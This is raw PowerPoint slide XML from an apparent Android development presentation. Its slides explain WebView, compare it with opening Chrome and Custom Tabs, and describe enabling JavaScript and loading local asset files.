            <a:pPr marL="285750" indent="-285750" fontAlgn="base">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>WebView</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> is a special view in Android that lets your app show web content — like a browser inside your app. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" fontAlgn="base">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-GB" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" fontAlgn="base">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>It can load web pages from the internet or HTML/JavaScript files that are part of your app.</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E01F154D-C218-754E-67AA-77C6AFFDDA32}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="68143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2D065-93E5-90F3-73AD-2D76CF2BF4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E90C58-EF8D-ED86-59A5-4338058C4C35}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3635828" y="2334704"/>
            <a:ext cx="3730389" cy="3693319"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent5">
              <a:lumMod val="60000"/>
              <a:lumOff val="40000"/>
            </a:schemeClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>What happens:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Uses Chrome (or another browser supporting the protocol) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>inside your app</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, but still as a browser instance. Faster load (pre-warming, pre-fetching). Shares cookies, passwords, history with Chrome (SSO works).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1738DFD3-9A38-B28C-72BD-19CCA1D36109}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7354605" y="2325685"/>
            <a:ext cx="4856328" cy="2585323"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFC000"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>What happens:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>An embedded browser engine (based on Chromium) that you bundle </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>inside your app</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>. Complete control of the UI and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>behavior</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="13" name="Group 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F9F04903-CC67-3D4C-EF16-765EA23B181F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="-18932" y="2321641"/>
            <a:ext cx="3686768" cy="4595121"/>
            <a:chOff x="-18932" y="2321641"/>
            <a:chExt cx="3686768" cy="4595121"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="2" name="TextBox 1">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2E10CE17-8880-5B42-05B0-7218DC0F1B6A}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="-18932" y="2321641"/>
              <a:ext cx="3686768" cy="3416320"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="00B0F0"/>
            </a:solidFill>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="en-IN" b="1" dirty="0"/>
                <a:t>What happens:</a:t>
              </a:r>
              <a:br>
                <a:rPr lang="en-IN" dirty="0"/>
              </a:br>
              <a:r>
                <a:rPr lang="en-IN" dirty="0"/>
                <a:t>The app launches Chrome (or user’s default browser) via an Intent. The user leaves your app and moves to the browser. Full browser features (password managers, cookies, extensions, autofill, security updates).</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:endParaRPr lang="en-IN" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="Rectangle 6">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E107D4C0-AE57-9965-0726-5E9301BFC124}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="-14514" y="5670727"/>
              <a:ext cx="3667836" cy="1246035"/>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3BBA34C5-97B3-2890-7062-FC0457115955}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="402122" y="1607318"/>
            <a:ext cx="3251200" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Opening in Chrome</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B0F0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EF3C0C8F-50D7-63C6-A557-A9B51DD75F7B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8996095" y="1607317"/>
            <a:ext cx="1625600" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WebView </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FFC000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C798856C-0CDA-1C4B-7BFF-8390BC2B0383}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4633025" y="1607317"/>
            <a:ext cx="2375847" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Custom Tabs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D29E0F98-E0CF-FAE5-DE90-565E066A957D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7367668" y="4911008"/>
            <a:ext cx="4856328" cy="1938992"/>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
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2D3FAF49-D919-86D7-5DDC-26CD442ABF1E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3667837" y="5603965"/>
            <a:ext cx="3686768" cy="1254033"/>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C000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Picture 9" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{91581F73-8DB0-FC93-4302-6886178775D0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3185638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Alternative to Android WebView - Stack Overflow">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7831FE5-21D0-7803-FAC1-9930654338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700" y="692564"/>
            <a:ext cx="11119469" cy="625470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ue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B41A3842-410D-15FC-B8D9-C5245518131E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3814733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7F9213-2825-AD28-068C-5ECF05FF9D79}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2338251" y="1491191"/>
            <a:ext cx="7230249" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>webView.getSettings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>setJavaScriptEnabled</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(true);</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2E946156-80EE-7274-D669-FA8666B63836}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="909766" y="2773597"/>
            <a:ext cx="10372465" cy="1015663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>This line enables </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>JavaScript execution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> inside an Android WebView. By default, JavaScript is disabled in WebView for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>security reasons</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>, so you must explicitly turn it on if the pages you load require JavaScript to function (like modern web apps, forms, dynamic content, etc.).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{032F4DA8-4855-3B19-1379-80C7DFC5AA00}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="715307" y="4633279"/>
            <a:ext cx="10761385" cy="1323439"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>Why it’s needed:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Many websites rely on JavaScript for rendering, user interactions, or API calls. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>Without this setting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>, interactive elements (like buttons, menus, forms) may not work properly in the WebView.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Picture 2" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F9624154-4838-8171-2960-C71A4485E912}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1304840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B157A-FF4B-661E-4EFC-62AE412CEB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26766E-C3F6-1DD0-66C6-FE8E20B3D9D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="293426" y="2653498"/>
            <a:ext cx="4053385" cy="3139321"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>WebView can load both </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>online content</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>local HTML/JS files</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>from the app’s </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/assets/ folder </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>for offline use.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Local files are accessed via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>file:///</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>android_asset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>/ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>(though </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>AssetLoader</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> is now recommended). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Since assets are bundled inside the APK, they’re </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>publicly accessible</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, unlike other internal app files.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C85456EF-C01E-4FBE-DC7A-80EBE403B59D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
